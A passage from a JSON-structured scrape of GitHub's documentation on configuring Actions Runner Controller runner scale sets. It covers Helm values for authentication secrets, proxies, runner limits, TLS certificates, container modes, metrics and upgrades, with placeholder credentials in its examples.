      },
      {
        "type": "heading",
        "level": 4,
        "text": "Option 1: Create a Kubernetes secret (recommended)"
      },
      {
        "type": "paragraph",
        "text": "Once you have created your GitHub App, create a Kubernetes secret and pass the reference to that secret in your copy of thevalues.yamlfile."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Create the secret in the same namespace where thegha-runner-scale-setchart is installed. In this example, the namespace isarc-runnersto match the quickstart documentation. For more information, seeQuickstart for Actions Runner Controller."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "kubectl create secret generic pre-defined-secret \\\n  --namespace=arc-runners \\\n  --from-literal=github_app_id=123456 \\\n  --from-literal=github_app_installation_id=654321 \\\n  --from-file=github_app_private_key=private-key.pem"
      },
      {
        "type": "paragraph",
        "text": "In your copy of thevalues.yamlpass the secret name as a reference."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "githubConfigSecret: pre-defined-secret"
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Option 2: Specify values in yourvalues.yamlfile"
      },
      {
        "type": "paragraph",
        "text": "Alternatively, you can specify the values ofapp_id,installation_idandprivate_keyin your copy of thevalues.yamlfile."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "## githubConfigSecret is the Kubernetes secret to use when authenticating with GitHub API.\n## You can choose to use a GitHub App or a personal access token (classic)\ngithubConfigSecret:\n  ## GitHub Apps Configuration\n  ## IDs must be strings, use quotes\n  github_app_id: \"123456\"\n  github_app_installation_id: \"654321\"\n  github_app_private_key: |\n    -----BEGIN RSA PRIVATE KEY-----\n    ...\n    HkVN9...\n    ...\n    -----END RSA PRIVATE KEY-----"
      },
      {
        "type": "paragraph",
        "text": "For additional Helm configuration options, seevalues.yamlin the ARC repository."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Managing access with runner groups"
      },
      {
        "type": "paragraph",
        "text": "You can use runner groups to control which organizations or repositories have access to your runner scale sets. For more information on runner groups, seeManaging access to self-hosted runners using groups."
      },
      {
        "type": "paragraph",
        "text": "To add a runner scale set to a runner group, you must already have a runner group created. Then set therunnerGroupproperty in your copy of thevalues.yamlfile. The following example adds a runner scale set to the Octo-Group runner group."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "runnerGroup: \"Octo-Group\""
      },
      {
        "type": "paragraph",
        "text": "For additional Helm configuration options, seevalues.yamlin the ARC repository."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Configuring an outbound proxy"
      },
      {
        "type": "paragraph",
        "text": "To force HTTP traffic for the controller and runners to go through your outbound proxy, set the following properties in your Helm chart."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "proxy:\n  http:\n    url: http://proxy.com:1234\n    credentialSecretRef: proxy-auth # a Kubernetes secret with `username` and `password` keys\n  https:\n    url: http://proxy.com:1234\n    credentialSecretRef: proxy-auth # a Kubernetes secret with `username` and `password` keys\n  noProxy:\n    - example.com\n    - example.org"
      },
      {
        "type": "paragraph",
        "text": "ARC supports using anonymous or authenticated proxies. If you use authenticated proxies, you will need to set thecredentialSecretRefvalue to reference a Kubernetes secret. You can create a secret with your proxy credentials with the following command."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Create the secret in the same namespace where thegha-runner-scale-setchart is installed. In this example, the namespace isarc-runnersto match the quickstart documentation. For more information, seeQuickstart for Actions Runner Controller."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "kubectl create secret generic proxy-auth \\\n    --namespace=arc-runners \\\n    --from-literal=username=proxyUsername \\\n    --from-literal=password=proxyPassword \\"
      },
      {
        "type": "paragraph",
        "text": "For additional Helm configuration options, seevalues.yamlin the ARC repository."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Setting the maximum and minimum number of runners"
      },
      {
        "type": "paragraph",
        "text": "ThemaxRunnersandminRunnersproperties provide you with a range of options to customize your ARC setup."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "ARC does not support scheduled maximum and minimum configurations. You can use a cronjob or any other scheduling solution to update the configuration on a schedule."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Example: Unbounded number of runners"
      },
      {
        "type": "paragraph",
        "text": "If you comment out both themaxRunnersandminRunnersproperties, ARC will scale up to the number of jobs assigned to the runner scale set and will scale down to 0 if there aren't any active jobs."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "## maxRunners is the max number of runners the auto scaling runner set will scale up to.\n# maxRunners: 0\n\n## minRunners is the min number of idle runners. The target number of runners created will be\n## calculated as a sum of minRunners and the number of jobs assigned to the scale set.\n# minRunners: 0"
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Example: Minimum number of runners"
      },
      {
        "type": "paragraph",
        "text": "You can set theminRunnersproperty to any number and ARC will make sure there is always the specified number of runners active and available to take jobs assigned to the runner scale set at all times."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "## maxRunners is the max number of runners the auto scaling runner set will scale up to.\n# maxRunners: 0\n\n## minRunners is the min number of idle runners. The target number of runners created will be\n## calculated as a sum of minRunners and the number of jobs assigned to the scale set.\nminRunners: 20"
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Example: Set maximum and minimum number of runners"
      },
      {
        "type": "paragraph",
        "text": "In this configuration, Actions Runner Controller will scale up to a maximum of30runners and will scale down to20runners when the jobs are complete."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "The value ofminRunnerscan never exceed that ofmaxRunners, unlessmaxRunnersis commented out."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "## maxRunners is the max number of runners the auto scaling runner set will scale up to.\nmaxRunners: 30\n\n## minRunners is the min number of idle runners. The target number of runners created will be\n## calculated as a sum of minRunners and the number of jobs assigned to the scale set.\nminRunners: 20"
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Example: Jobs queue draining"
      },
      {
        "type": "paragraph",
        "text": "In certain scenarios you might want to drain the jobs queue to troubleshoot a problem or to perform maintenance on your cluster. If you set both properties to0, Actions Runner Controller will not create new runner pods when new jobs are available and assigned."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "## maxRunners is the max number of runners the auto scaling runner set will scale up to.\nmaxRunners: 0\n\n## minRunners is the min number of idle runners. The target number of runners created will be\n## calculated as a sum of minRunners and the number of jobs assigned to the scale set.\nminRunners: 0"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Custom TLS certificates"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "If you are using a custom runner image that is not based on theDebiandistribution, the following instructions will not work."
      },
      {
        "type": "paragraph",
        "text": "Some environments require TLS certificates that are signed by a custom certificate authority (CA). Since the custom certificate authority certificates are not bundled with the controller or runner containers, you must inject them into their respective trust stores."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "githubServerTLS:\n  certificateFrom:\n    configMapKeyRef:\n      name: config-map-name\n      key: ca.crt\n  runnerMountPath: /usr/local/share/ca-certificates/"
      },
      {
        "type": "paragraph",
        "text": "When you do this, ensure you are using the Privacy Enhanced Mail (PEM) format and that the extension of your certificate is.crt. Anything else will be ignored."
      },
      {
        "type": "paragraph",
        "text": "The controller executes the following actions."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Creates agithub-server-tls-certvolume containing the certificate specified incertificateFrom.",
          "Mounts that volume on pathrunnerMountPath/<certificate name>.",
          "Sets theNODE_EXTRA_CA_CERTSenvironment variable to that same path.",
          "Sets theRUNNER_UPDATE_CA_CERTSenvironment variable to1(as of version2.303.0, this will instruct the runner to reload certificates on the host)."
        ]
      },
      {
        "type": "paragraph",
        "text": "ARC observes values set in the runner pod template and does not overwrite them."
      },
      {
        "type": "paragraph",
        "text": "For additional Helm configuration options, seevalues.yamlin the ARC repository."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using a private container registry"
      },
      {
        "type": "paragraph",
        "text": "Warning"
      },
      {
        "type": "paragraph",
        "text": "This Actions Runner Controller customization option may be outside the scope of what GitHub Support can assist with and may cause unexpected behavior when configured incorrectly."
      },
      {
        "type": "paragraph",
        "text": "For more information about what GitHub Support can assist with, seeAbout support for Actions Runner Controller."
      },
      {
        "type": "paragraph",
        "text": "To use a private container registry, you can copy the controller image and runner image to your private container registry. Then configure the links to those images and set theimagePullPolicyandimagePullSecretsvalues."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Configuring the controller image"
      },
      {
        "type": "paragraph",
        "text": "You can update your copy of thevalues.yamlfile and set theimageproperties as follows."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "image:\n  repository: \"custom-registry.io/gha-runner-scale-set-controller\"\n  pullPolicy: IfNotPresent\n  # Overrides the image tag whose default is the chart appVersion.\n  tag: \"0.4.0\"\n\nimagePullSecrets:\n  - name: <registry-secret-name>"
      },
      {
        "type": "paragraph",
        "text": "The listener container inherits theimagePullPolicydefined for the controller."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Configuring the runner image"
      },
      {
        "type": "paragraph",
        "text": "You can update your copy of thevalues.yamlfile and set thetemplate.specproperties as follows."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "template:\n  spec:\n    containers:\n      - name: runner\n        image: \"custom-registry.io/actions-runner:latest\"\n        imagePullPolicy: Always\n        command: [\"/home/runner/run.sh\"]\n    imagePullSecrets:\n      - name: <registry-secret-name>"
      },
      {
        "type": "paragraph",
        "text": "For additional Helm configuration options, seevalues.yamlin the ARC repository."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Updating the pod specification for the runner pod"
      },
      {
        "type": "paragraph",
        "text": "Warning"
      },
      {
        "type": "paragraph",
        "text": "This Actions Runner Controller customization option may be outside the scope of what GitHub Support can assist with and may cause unexpected behavior when configured incorrectly."
      },
      {
        "type": "paragraph",
        "text": "For more information about what GitHub Support can assist with, seeAbout support for Actions Runner Controller."
      },
      {
        "type": "paragraph",
        "text": "You can fully customize the PodSpec of the runner pod and the controller will apply the configuration you specify. The following is an example pod specification."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "template:\n  spec:\n    containers:\n      - name: runner\n        image: ghcr.io/actions/actions-runner:latest\n        command: [\"/home/runner/run.sh\"]\n        resources:\n          limits:\n            cpu: 500m\n            memory: 512Mi\n        securityContext:\n          readOnlyRootFilesystem: true\n          allowPrivilegeEscalation: false\n          capabilities:\n            add:\n              - NET_ADMIN"
      },
      {
        "type": "paragraph",
        "text": "For additional Helm configuration options, seevalues.yamlin the ARC repository."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Updating the pod specification for the listener pod"
      },
      {
        "type": "paragraph",
        "text": "Warning"
      },
      {
        "type": "paragraph",
        "text": "This Actions Runner Controller customization option may be outside the scope of what GitHub Support can assist with and may cause unexpected behavior when configured incorrectly."
      },
      {
        "type": "paragraph",
        "text": "For more information about what GitHub Support can assist with, seeAbout support for Actions Runner Controller."
      },
      {
        "type": "paragraph",
        "text": "You can customize the PodSpec of the listener pod and the controller will apply the configuration you specify. The following is an example pod specification."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "It's important to not change thelistenerTemplate.spec.containers.namevalue of the listener container. Otherwise, the configuration you specify will be applied to a new side-car container."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "listenerTemplate:\n  spec:\n    containers:\n    # If you change the name of the container, the configuration will not be applied to the listener,\n    # and it will be treated as a side-car container.\n    - name: listener\n      securityContext:\n        runAsUser: 1000\n      resources:\n        limits:\n          cpu: \"1\"\n          memory: 1Gi\n        requests:\n          cpu: \"1\"\n          memory: 1Gi"
      },
      {
        "type": "paragraph",
        "text": "For additional Helm configuration options, seevalues.yamlin the ARC repository."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using Docker-in-Docker or Kubernetes mode for containers"
      },
      {
        "type": "paragraph",
        "text": "Warning"
      },
      {
        "type": "paragraph",
        "text": "This Actions Runner Controller customization option may be outside the scope of what GitHub Support can assist with and may cause unexpected behavior when configured incorrectly."
      },
      {
        "type": "paragraph",
        "text": "For more information about what GitHub Support can assist with, seeAbout support for Actions Runner Controller."
      },
      {
        "type": "paragraph",
        "text": "If you are using container jobs and services or container actions, thecontainerModevalue must be set todindorkubernetes."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "For more information on container jobs and services, seeRunning jobs in a container.",
          "For more information on container actions, seeCreating a Docker container action."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using Docker-in-Docker mode"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "The Docker-in-Docker container requires privileged mode. For more information, seeConfigure a Security Context for a Pod or Containerin the Kubernetes documentation."
      },
      {
        "type": "paragraph",
        "text": "By default, thedindcontainer uses thedocker:dindimage, which runs the Docker daemon as root. You can replace this image withdocker:dind-rootlessas long as you are aware of theknown limitationsand run the pods with--privilegedmode. To learn how to customize the Docker-in-Docker configuration, seeCustomizing container modes."
      },
      {
        "type": "paragraph",
        "text": "Docker-in-Docker mode is a configuration that allows you to run Docker inside a Docker container. In this configuration, for each runner pod created, ARC creates the following containers."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Aninitcontainer",
          "Arunnercontainer",
          "Adindcontainer"
        ]
      },
      {
        "type": "paragraph",
        "text": "To enable Docker-in-Docker mode, set thecontainerMode.typetodindas follows."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "containerMode:\n  type: \"dind\""
      },
      {
        "type": "paragraph",
        "text": "Thetemplate.specwill be updated to the following default configuration."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "template:\n  spec:\n    initContainers:\n      - name: init-dind-externals\n        image: ghcr.io/actions/actions-runner:latest\n        command:\n          [\"cp\", \"-r\", \"/home/runner/externals/.\", \"/home/runner/tmpDir/\"]\n        volumeMounts:\n          - name: dind-externals\n            mountPath: /home/runner/tmpDir\n    containers:\n      - name: runner\n        image: ghcr.io/actions/actions-runner:latest\n        command: [\"/home/runner/run.sh\"]\n        env:\n          - name: DOCKER_HOST\n            value: unix:///var/run/docker.sock\n        volumeMounts:\n          - name: work\n            mountPath: /home/runner/_work\n          - name: dind-sock\n            mountPath: /var/run\n      - name: dind\n        image: docker:dind\n        args:\n          - dockerd\n          - --host=unix:///var/run/docker.sock\n          - --group=$(DOCKER_GROUP_GID)\n        env:\n          - name: DOCKER_GROUP_GID\n            value: \"123\"\n        securityContext:\n          privileged: true\n        volumeMounts:\n          - name: work\n            mountPath: /home/runner/_work\n          - name: dind-sock\n            mountPath: /var/run\n          - name: dind-externals\n            mountPath: /home/runner/externals\n    volumes:\n      - name: work\n        emptyDir: {}\n      - name: dind-sock\n        emptyDir: {}\n      - name: dind-externals\n        emptyDir: {}"
      },
      {
        "type": "paragraph",
        "text": "The values intemplate.specare automatically injected and cannot be overridden. If you want to customize this setup, you must unsetcontainerMode.type, then copy this configuration and apply it directly in your copy of thevalues.yamlfile."
      },
      {
        "type": "paragraph",
        "text": "For additional Helm configuration options, seevalues.yamlin the ARC repository."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using Kubernetes mode"
      },
      {
        "type": "paragraph",
        "text": "In Kubernetes mode, ARC uses runner container hooks to create a new pod in the same namespace to run the service, container job, or action."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Prerequisites"
      },
      {
        "type": "paragraph",
        "text": "Kubernetes mode relies on persistent volumes to share job details between the runner pod and the container job pod. For more information, see thePersistent Volumessection in the Kubernetes documentation."
      },
      {
        "type": "paragraph",
        "text": "To use Kubernetes mode, you must do the following."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Create persistent volumes available for the runner pods to claim.",
          "Use a solution to automatically provision persistent volumes on demand."
        ]
      },
      {
        "type": "paragraph",
        "text": "For testing, you can use a solution likeOpenEBS."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Configuring Kubernetes mode"
      },
      {
        "type": "paragraph",
        "text": "To enable Kubernetes mode, set thecontainerMode.typetokubernetesin yourvalues.yamlfile."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "containerMode:\n  type: \"kubernetes\"\n  kubernetesModeWorkVolumeClaim:\n    accessModes: [\"ReadWriteOnce\"]\n    storageClassName: \"dynamic-blob-storage\"\n    resources:\n      requests:\n        storage: 1Gi"
      },
      {
        "type": "paragraph",
        "text": "For additional Helm configuration options, seevalues.yamlin the ARC repository."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "When Kubernetes mode is enabled, workflows that are not configured with a container job will fail with an error similar to:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "Jobs without a job container are forbidden on this runner, please add a 'container:' to your job or contact your self-hosted runner administrator."
      },
      {
        "type": "paragraph",
        "text": "To allow jobs without a job container to run, setACTIONS_RUNNER_REQUIRE_JOB_CONTAINERtofalseon your runner container. This instructs the runner to disable this check."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "template:\n  spec:\n    containers:\n      - name: runner\n        image: ghcr.io/actions/actions-runner:latest\n        command: [\"/home/runner/run.sh\"]\n        env:\n          - name: ACTIONS_RUNNER_REQUIRE_JOB_CONTAINER\n            value: \"false\""
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Customizing container modes"
      },
      {
        "type": "paragraph",
        "text": "When you set thecontainerModein thevalues.yamlfile for thegha-runner-scale-sethelm chart, you can use either of the following values:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "dindor",
          "kubernetes"
        ]
      },
      {
        "type": "paragraph",
        "text": "Depending on which value you set for thecontainerMode, a configuration will automatically be injected into thetemplatesection of thevalues.yamlfile for thegha-runner-scale-sethelm chart."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "See thedindconfiguration.",
          "See thekubernetesconfiguration."
        ]
      },
      {
        "type": "paragraph",
        "text": "To customize the spec, comment out or removecontainerMode, and append the configuration you want in thetemplatesection."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Example: runningdind-rootless"
      },
      {
        "type": "paragraph",
        "text": "Before deciding to rundind-rootless, make sure you are aware ofknown limitations."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "## githubConfigUrl is the GitHub url for where you want to configure runners\n## ex: https://github.com/myorg/myrepo or https://github.com/myorg\ngithubConfigUrl: \"https://github.com/actions/actions-runner-controller\"\n\n## githubConfigSecret is the k8s secrets to use when auth with GitHub API.\n## You can choose to use GitHub App or a PAT token\ngithubConfigSecret: my-super-safe-secret\n\n## maxRunners is the max number of runners the autoscaling runner set will scale up to.\nmaxRunners: 5\n\n## minRunners is the min number of idle runners. The target number of runners created will be\n## calculated as a sum of minRunners and the number of jobs assigned to the scale set.\nminRunners: 0\n\nrunnerGroup: \"my-custom-runner-group\"\n\n## name of the runner scale set to create. Defaults to the helm release name\nrunnerScaleSetName: \"my-awesome-scale-set\"\n\n## template is the PodSpec for each runner Pod\n## For reference: https://kubernetes.io/docs/reference/kubernetes-api/workload-resources/pod-v1/#PodSpec\ntemplate:\n  spec:\n    initContainers:\n    - name: init-dind-externals\n      image: ghcr.io/actions/actions-runner:latest\n      command: [\"cp\", \"-r\", \"/home/runner/externals/.\", \"/home/runner/tmpDir/\"]\n      volumeMounts:\n        - name: dind-externals\n          mountPath: /home/runner/tmpDir\n    - name: init-dind-rootless\n      image: docker:dind-rootless\n      command:\n        - sh\n        - -c\n        - |\n          set -x\n          cp -a /etc/. /dind-etc/\n          echo 'runner:x:1001:1001:runner:/home/runner:/bin/ash' >> /dind-etc/passwd\n          echo 'runner:x:1001:' >> /dind-etc/group\n          echo 'runner:100000:65536' >> /dind-etc/subgid\n          echo 'runner:100000:65536' >> /dind-etc/subuid\n          chmod 755 /dind-etc;\n          chmod u=rwx,g=rx+s,o=rx /dind-home\n          chown 1001:1001 /dind-home\n      securityContext:\n        runAsUser: 0\n      volumeMounts:\n        - mountPath: /dind-etc\n          name: dind-etc\n        - mountPath: /dind-home\n          name: dind-home\n    containers:\n    - name: runner\n      image: ghcr.io/actions/actions-runner:latest\n      command: [\"/home/runner/run.sh\"]\n      env:\n        - name: DOCKER_HOST\n          value: unix:///run/user/1001/docker.sock\n      securityContext:\n        privileged: true\n        runAsUser: 1001\n        runAsGroup: 1001\n      volumeMounts:\n        - name: work\n          mountPath: /home/runner/_work\n        - name: dind-sock\n          mountPath: /run/user/1001\n    - name: dind\n      image: docker:dind-rootless\n      args:\n        - dockerd\n        - --host=unix:///run/user/1001/docker.sock\n      securityContext:\n        privileged: true\n        runAsUser: 1001\n        runAsGroup: 1001\n      volumeMounts:\n        - name: work\n          mountPath: /home/runner/_work\n        - name: dind-sock\n          mountPath: /run/user/1001\n        - name: dind-externals\n          mountPath: /home/runner/externals\n        - name: dind-etc\n          mountPath: /etc\n        - name: dind-home\n          mountPath: /home/runner\n    volumes:\n    - name: work\n      emptyDir: {}\n    - name: dind-externals\n      emptyDir: {}\n    - name: dind-sock\n      emptyDir: {}\n    - name: dind-etc\n      emptyDir: {}\n    - name: dind-home\n      emptyDir: {}"
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Understanding runner-container-hooks"
      },
      {
        "type": "paragraph",
        "text": "When the runner detects a workflow run that uses a container job, service container, or Docker action, it will call runner-container-hooks to create a new pod. The runner relies on runner-container-hooks to call the Kubernetes APIs and create a new pod in the same namespace as the runner pod. This newly created pod will be used to run the container job, service container, or Docker action. For more information, see therunner-container-hooksrepository."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Configuring hook extensions"
      },
      {
        "type": "paragraph",
        "text": "As of ARC version 0.4.0, runner-container-hooks support hook extensions. You can use these to configure the pod created by runner-container-hooks. For example, you could use a hook extension to set a security context on the pod. Hook extensions allow you to specify a YAML file that is used to update thePodSpecof the pod created by runner-container-hooks."
      },
      {
        "type": "paragraph",
        "text": "There are two options to configure hook extensions."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Store in yourcustom runner image. You can store the PodSpec in a YAML file anywhere in your custom runner image. For more information, seeAbout Actions Runner Controller.",
          "Store in aConfigMap. You can create a config map with the PodSpec and mount that config map in the runner container. For more information, seeConfigMapsin the Kubernetes documentation."
        ]
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "With both options, you must set theACTIONS_RUNNER_CONTAINER_HOOK_TEMPLATEenvironment variable in the runner container spec to point to the path of the YAML file mounted in the runner container."
      },
      {
        "type": "heading",
        "level": 5,
        "text": "Example: Using config map to set securityContext"
      },
      {
        "type": "paragraph",
        "text": "Create a config map in the same namespace as the runner pods. For example:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "apiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: hook-extension\n  namespace: arc-runners\ndata:\n  content: |\n    metadata:\n      annotations:\n        example: \"extension\"\n    spec:\n      containers:\n        - name: \"$job\" # Target the job container\n          securityContext:\n            runAsUser: 1000"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "The.metadata.labelsandmetadata.annotationsfields will be appended as is, unless their keys are reserved. You cannot override the.metadata.nameandmetadata.namespacefields.",
          "The majority of the PodSpec fields are applied from the specified template, and will override the values passed from your Helm chartvalues.yamlfile.",
          "If you specify additional volumes they will be appended to the default volumes specified by the runner.",
          "Thespec.containersare merged based on the names assigned to them.If the name of the container is$job:Thespec.containers.nameandspec.containers.imagefields are ignored.Thespec.containers.env,spec.containers.volumeMounts, andspec.containers.portsfields are appended to the default container spec created by the hook.The rest of the fields are applied as provided.If the name of the container is not$job, the fields will be added to the pod definition as they are.",
          "If the name of the container is$job:Thespec.containers.nameandspec.containers.imagefields are ignored.Thespec.containers.env,spec.containers.volumeMounts, andspec.containers.portsfields are appended to the default container spec created by the hook.The rest of the fields are applied as provided.",
          "Thespec.containers.nameandspec.containers.imagefields are ignored.",
          "Thespec.containers.env,spec.containers.volumeMounts, andspec.containers.portsfields are appended to the default container spec created by the hook.",
          "The rest of the fields are applied as provided.",
          "If the name of the container is not$job, the fields will be added to the pod definition as they are."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Enabling metrics"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Metrics for ARC are available as of version gha-runner-scale-set-0.5.0."
      },
      {
        "type": "paragraph",
        "text": "ARC can emit metrics about your runners, your jobs, and time spent on executing your workflows. Metrics can be used to identify congestion, monitor the health of your ARC deployment, visualize usage trends, optimize resource consumption, among many other use cases. Metrics are emitted by the controller-manager and listener pods in Prometheus format. For more information, seeExposition formatsin the Prometheus documentation."
      },
      {
        "type": "paragraph",
        "text": "To enable metrics for ARC, configure themetricsproperty in thevalues.yamlfile of thegha-runner-scale-set-controllerchart."
      },
      {
        "type": "paragraph",
        "text": "The following is an example configuration."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "metrics:\n  controllerManagerAddr: \":8080\"\n  listenerAddr: \":8080\"\n  listenerEndpoint: \"/metrics\""
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "If themetrics:object is not provided or is commented out, the following flags will be applied to the controller-manager and listener pods with empty values:--metrics-addr,--listener-metrics-addr,--listener-metrics-endpoint. This will disable metrics for ARC."
      },
      {
        "type": "paragraph",
        "text": "Once these properties are configured, your controller-manager and listener pods emit metrics via the listenerEndpoint bound to the ports that you specify in yourvalues.yamlfile. In the above example, the endpoint is/metricsand the port is:8080. You can use this endpoint to scrape metrics from your controller-manager and listener pods."
      },
      {
        "type": "paragraph",
        "text": "To turn off metrics, update yourvalues.yamlfile by removing or commenting out themetrics:object and its properties."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Available metrics for ARC"
      },
      {
        "type": "paragraph",
        "text": "The following table shows the metrics emitted by the controller-manager and listener pods."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "The metrics that the controller-manager emits pertain to the controller runtime and are not owned by GitHub."
      },
      {
        "type": "paragraph",
        "text": "[1]: Listener metrics that have the counter type are reset when the listener pod restarts."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Upgrading ARC"
      },
      {
        "type": "paragraph",
        "text": "Because there is no support for upgrading or deleting CRDs with Helm, it is not possible to use Helm to upgrade ARC. For more information, seeCustom Resource Definitionsin the Helm documentation. To upgrade ARC to a newer version, you must complete the following steps."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Uninstall all installations ofgha-runner-scale-set.",
          "Wait for resources cleanup.",
          "Uninstall ARC.",
          "If there is a change in CRDs from the version you currently have installed, to the upgraded version, remove all CRDs associated withactions.github.comAPI group.",
          "Reinstall ARC again."
        ]
      },
      {
        "type": "paragraph",
        "text": "For more information, seeDeploying a runner scale set."
      },
      {
        "type": "paragraph",
        "text": "If you would like to upgrade ARC but are concerned about downtime, you can deploy ARC in a high availability configuration to ensure runners are always available. For more information, seeHigh availability and automatic failover."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Transitioning from thecommunity supported version of ARCto the GitHub supported version is a substantial architectural change. The GitHub supported version involves a redesign of many components of ARC. It is not a minor software upgrade. For these reasons, we recommend testing the new versions in a staging environment that matches your production environment first. This will ensure stability and reliability of the setup before deploying in production."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Deploying a canary image"
      },
      {
        "type": "paragraph",
        "text": "You can test features before they are released by using canary releases of the controller-manager container image. Canary images are published with tag formatcanary-SHORT_SHA. For more information, seegha-runner-scale-set-controlleron the Container registry."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "You must use Helm charts on your local file system.",
          "You cannot use the released Helm charts."
        ]
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Update thetagin thegha-runner-scale-set-controllervalues.yamlfile to:canary-SHORT_SHA",
          "Update the fieldappVersionin theChart.yamlfile forgha-runner-scale-setto:canary-SHORT_SHA",
          "Re-install ARC using the updated Helm chart andvalues.yamlfiles."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "High availability and automatic failover"
      },
      {
        "type": "paragraph",
        "text": "ARC can be deployed in a high availability (active-active) configuration. If you have two distinct Kubernetes clusters deployed in separate regions, you can deploy ARC in both clusters and configure runner scale sets to use the samerunnerScaleSetName. In order to do this, each runner scale set must be assigned to a distinct runner group. For example, you can have two runner scale sets each namedarc-runner-set, as long as one runner scale set belongs torunner-group-Aand the other runner scale set belongs torunner-group-B. For information on assigning runner scale sets to runner groups, seeManaging access to self-hosted runners using groups."
      },
      {
        "type": "paragraph",
        "text": "If both runner scale sets are online, jobs assigned to them will be distributed arbitrarily (assignment race). You cannot configure the job assignment algorithm. If one of the clusters goes down, the runner scale set in the other cluster will continue to acquire jobs normally without any intervention or configuration change."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using ARC across organizations"
      },
      {
        "type": "paragraph",
        "text": "A single installation of Actions Runner Controller allows you to configure one or more runner scale sets. These runner scale sets can be registered to a repository, organization, or enterprise. You can also use runner groups to control the permissions boundaries of these runner scale sets."
      },
      {
        "type": "paragraph",
        "text": "As a best practice, create a unique namespace for each organization. You could also create a namespace for each runner group or each runner scale set. You can install as many runner scale sets as needed in each namespace. This will provide you the highest levels of isolation and improve your security. You can use GitHub Apps for authentication and define granular permissions for each runner scale set."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Legal notice"
      },
      {
        "type": "paragraph",
        "text": "Portions have been adapted fromhttps://github.com/actions/actions-runner-controller/under the Apache-2.0 license:"
      },
      {
        "type": "code",
        "language": "yaml",
